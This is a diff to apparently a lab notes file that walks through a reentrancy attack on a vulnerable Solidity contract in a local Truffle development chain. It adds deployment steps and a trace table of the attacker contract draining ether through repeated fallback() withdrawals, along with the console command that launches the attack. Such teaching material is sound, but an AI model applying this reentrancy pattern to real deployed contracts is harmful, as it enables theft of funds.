@@ -5,6 +5,12 @@ http://solidity.readthedocs.io/en/develop/contracts.html
 https://ethereum.stackexchange.com/questions/12778/how-to-send-some-amount-to-a-contract-in-truffle
 http://truffleframework.com/tutorials/debugging-a-smart-contract
 
+STEP 0 - Start truffle Deploy contracts
+Fron project root directory:
+truffle compile
+truffle develop
+truffle(develop)> migrate
+
 STEP 1 - Check our initial accounts balances
 truffle(develop)> Reentrant.deployed().then(instance => honeyPotAddress = instance.address)
 '0x9fbda871d559710256a2502a2517b794b482db40'
@@ -100,17 +106,17 @@ truffle(develop)>  Reentrant.deployed().then(function(instance){return instance.
 ReentrantAttacker attacks with 2
 ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(2, "ether") }))
 
-ReentrantAttacker             Reentrant      15 Ethers
-                       -2     deposit()  +2  17        
-                       +2     withdraw() -2  15
-fallback() 15>=2       +2     withdraw() -2  13
-fallback() 13>=2       +2     withdraw() -2  11
-fallback() 11>=2       +2     withdraw() -2  9
-fallback() 9>=2        +2     withdraw() -2  7
-fallback() 7>=2        +2     withdraw() -2  5
-fallback() 5>=2        +2     withdraw() -2  3
-fallback() 3>=2        +2     withdraw() -2  1
-fallback() 1 ! (>=2)
+ReentrantAttacker          ETH   Reentrant      15 Ethers
+                       -2        deposit()  +2  17        
+                       +2   2    withdraw() -2  15
+fallback() 15>=2       +2   4    withdraw() -2  13
+fallback() 13>=2       +2   6    withdraw() -2  11
+fallback() 11>=2       +2   8    withdraw() -2  9
+fallback() 9>=2        +2  10    withdraw() -2  7
+fallback() 7>=2        +2  12    withdraw() -2  5
+fallback() 5>=2        +2  14    withdraw() -2  3
+fallback() 3>=2        +2  16    withdraw() -2  1
+fallback() 1 ! (>=2)           
 
 truffle(develop)> Reentrant.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});
 8
